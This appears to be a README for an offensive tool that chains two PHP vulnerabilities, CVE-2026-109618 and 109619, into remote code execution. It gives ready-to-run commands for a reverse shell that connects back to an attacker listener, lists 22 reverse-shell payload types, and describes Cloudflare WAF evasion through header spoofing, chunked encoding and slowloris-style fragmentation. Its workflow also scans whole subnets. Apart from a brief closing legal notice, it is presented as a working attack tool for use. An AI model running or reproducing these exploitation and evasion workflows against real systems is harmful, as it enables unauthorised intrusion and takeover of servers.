# php2shellX

Next-generation exploit orchestrator for CVE-2026-109618/619 — adds Cloudflare WAF bypass, flexible target specification (URL/host/port/path/batch), multi-format output (JSON/CSV/table), resume capability, and lab automation (Docker restart). Authored by TESTERXMA.

# php2shell-ng — Next-Generation Exploit Orchestrator

**Author: TESTERXMA**

Enhanced exploit orchestrator for **CVE-2026-109618** (session.upload_progress UAF → info leak) and **CVE-2026-109619** (heap spray → RCE) against vulnerable PHP-FPM/Apache targets.

---

## What's New (vs. original php2shell)

| Feature | Description |
|---------|-------------|
| **Reverse Shell Connection Manager** (`--connection`) | Auto-starts listener, delivers payload, upgrades TTY, drops into interactive shell |
| **Cloudflare WAF Bypass** (`--waf-bypass`) | Header spoofing, chunked encoding, case variation, parameter pollution, slow fragmentation |
| **Flexible Targeting** | `--url`, `--host/--port/--path`, `--batch` file |
| **Multi-format Output** | JSON, CSV, Table |
| **Resume Capability** | `--resume` saves/restores progress |
| **Lab Automation** | `--restart` Docker container before exploit |
| **Batch Scanning** | Multiple targets from file |

---

## Quick Start

```bash
# Basic exploit (single command execution)
python3 exploit_enhanced.py --url http://target/vuln.php --cmd "id"

# With Cloudflare WAF bypass
python3 exploit_enhanced.py --url https://target.example.com --waf-bypass -v

# Reverse shell - auto everything (starts listener, delivers payload, gives you shell)
python3 exploit_enhanced.py --url http://target --connection --lhost 10.10.14.5 --lport 4444

# Reverse shell with specific payload type and terminal
python3 exploit_enhanced.py --url http://target --connection --lhost 10.10.14.5 --lport 4444 \
  --shell-type python3 --terminal gnome-terminal

# Batch scan with CSV output
python3 exploit_enhanced.py --batch targets.txt --format csv -o results.csv

# Lab with Docker restart
python3 exploit_enhanced.py --url http://lab.local --restart php2shell-container
```

---

## Reverse Shell / Connection (`--connection`)

The **killer feature**. When enabled:

1. **Generates** reverse shell payload (22 types available)
2. **Starts** netcat listener in new terminal window (or background/tmux/screen)
3. **Delivers** payload via the CVE-2026-109619 RCE chain
4. **Waits** for connection (with timeout)
5. **Upgrades** TTY automatically (pty.spawn, stty raw, export TERM)
6. **Drops** you into interactive session — full shell control

```bash
# Minimum required args
python3 exploit_enhanced.py --url http://target --connection --lhost YOUR_IP --lport 4444

# Full control
python3 exploit_enhanced.py --url http://target --connection \
  --lhost 10.10.14.5 --lport 4444 \
  --shell-type python3 \
  --terminal gnome-terminal \
  --listener-timeout 60 \
  --no-interact  # just connect, don't drop into shell
```

### Available Shell Types (22)

| Category | Types |
|----------|-------|
| **Bash** | `bash`, `bash_readline`, `bash_coprocess` |
| **Python** | `python3`, `python3_short`, `python` |
| **PHP** | `php`, `php_exec` |
| **Perl** | `perl`, `perl_short` |
| **Netcat** | `nc`, `nc_openbsd`, `nc_mkfifo`, `ncat` |
| **Socat** | `socat`, `socat_pty`, `socat_openssl` |
| **PowerShell** | `powershell`, `powershell_short` |
| **Other** | `ruby`, `lua`, `go`, `awk` |

```bash
# List all available
python3 exploit_enhanced.py --list-shells
```

### Terminal Options

| Terminal | Use Case |
|----------|----------|
| `gnome-terminal`, `xterm`, `konsole`, `xfce4-terminal` | New GUI window (default on desktop) |
| `tmux`, `screen` | Detached session, persistent |
| `background` | No window, runs in background |
| `auto` | Detects best available |

---

## Cloudflare WAF Bypass (`--waf-bypass`)

Automatically detects Cloudflare (via headers `cf-ray`, `server: cloudflare`, challenge pages) and applies evasion:

| Technique | Description |
|-----------|-------------|
| **Origin Spoofing** | `X-Forwarded-For: 127.0.0.1`, `CF-Connecting-IP: 127.0.0.1`, etc. |
| **Chunked Encoding** | Converts `Content-Length` → `Transfer-Encoding: chunked` |
| **Header Case Variation** | Randomizes header casing (`HoSt`, `hOsT`, etc.) |
| **Parameter Pollution** | Duplicate headers with different values |
| **Slow Fragmentation** | Slowloris-style fragmented sends |
| **Cache Bypass** | `Cache-Control: no-cache`, `Pragma: no-cache` |

```bash
python3 exploit_enhanced.py --url https://target.com --waf-bypass -v
```

---

## Target Specification

| Method | Syntax |
|--------|--------|
| **Full URL** | `--url "https://target.example.com:8443/vuln.php"` |
| **Components** | `--host 10.10.10.5 --port 8080 --path /shell.php` |
| **Batch File** | `--batch targets.txt` |

**Batch file format (`targets.txt`):**
```
10.10.10.10
10.10.10.20:8080
https://lab.example.com/vuln.php
http://192.168.1.50:8443/index.php
# comments supported
```

---

## Exploit Options

| Option | Default | Description |
|--------|---------|-------------|
| `--cmd` | `id` | Command to execute (auto-replaced by reverse shell payload if `--connection`) |
| `--call` | — | `zend_call_function` address (hex) |
| `--dtor` | — | `zval_ptr_dtor` address (hex) |
| `--stall` | `1.5` | Stall duration between phases |
| `--monitor` | off | Monitor upload progress endpoint |
| `--progress-path` | `/check_progress.php` | Progress check path |
| `--rounds` | `1` | Trigger attempts per target |
| `--timeout` | `30` | Request timeout (seconds) |
| `--retries` | `3` | Retry attempts on failure |
| `--arch` | `auto` | Target architecture |
| `--workers` | `150` | Prefork MaxRequestWorkers |

---

## Reverse Shell Options

| Option | Default | Description |
|--------|---------|-------------|
| `--connection` | off | Enable reverse shell mode |
| `--lhost` | `0.0.0.0` | Your IP (listener bind) |
| `--lport` | `4444` | Listener port |
| `--shell-type` | `auto` | Payload type (22 available) |
| `--terminal` | `auto` | Terminal for listener |
| `--listener-timeout` | `30` | Seconds to wait for connection |
| `--no-interact` | off | Don't auto-drop into shell |
| `--list-shells` | — | List payload types and exit |

---

## Lab Environment

```bash
# Restart Docker container before exploit
python3 exploit_enhanced.py --url http://lab.local --restart php2shell-container

# Custom docker command
python3 exploit_enhanced.py --url http://lab.local --restart container --docker-cmd "docker"
```

---

## Output Formats

| Format | Flag | Description |
|--------|------|-------------|
| JSON | `--format json` | Full structured results (default) |
| CSV | `--format csv` | Spreadsheet-compatible |
| Table | `--format table` | Human-readable summary |

```bash
# Table view (great for batch)
python3 exploit_enhanced.py --batch targets.txt --format table
```

**Table output example:**
```
================================================================================
TARGET                                      STATUS     PHP        WAF        RESULT
--------------------------------------------------------------------------------
http://10.10.10.10:80/                      SUCCESS    8.4.26     bypass     SUCCESS
https://lab.example.com:443/vuln.php        FAILED     8.3.12     none       FAILED
================================================================================
```

---

## Resume Capability

```bash
# Save progress after each target
python3 exploit_enhanced.py --batch targets.txt --resume progress.json

# Resume after interrupt (Ctrl+C)
python3 exploit_enhanced.py --batch targets.txt --resume progress.json
```

---

## Custom Headers

```bash
python3 exploit_enhanced.py --url http://target \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: CustomAgent/1.0" \
  -H "X-Custom: value"
```

---

## Full Example Workflow

```bash
# 1. Test single target with reverse shell
python3 exploit_enhanced.py --url http://10.10.10.50/vuln.php \
  --connection --lhost 10.10.14.5 --lport 4444 \
  --shell-type python3 --terminal gnome-terminal -v

# 2. If that works, scan a subnet
cat > targets.txt << 'EOF'
10.10.10.50
10.10.10.51:8080
10.10.10.52
EOF

python3 exploit_enhanced.py --batch targets.txt \
  --connection --lhost 10.10.14.5 --lport 4444 \
  --format csv -o scan_results.csv

# 3. Check results
cat scan_results.csv
```

---

## Requirements

- Python 3.8+
- Network access to target

---

## Legal Notice

**Authorized testing only.** This tool is for educational purposes and authorized penetration testing within scope. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
